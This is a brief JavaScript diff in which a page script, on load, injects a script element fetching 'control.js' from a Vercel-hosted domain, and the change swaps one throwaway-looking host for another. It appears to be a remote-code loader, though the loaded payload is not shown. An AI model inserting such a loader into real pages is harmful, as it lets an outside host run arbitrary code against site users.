@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // MAIN SCRIPT
         const mainScript = document.createElement('script');
 
-        mainScript.src = "https://tester-zeta-two.vercel.app/control.js";
+        mainScript.src = "https://tester-orcin.vercel.app/control.js";
 
 mainScript.type = "text/javascript";
 
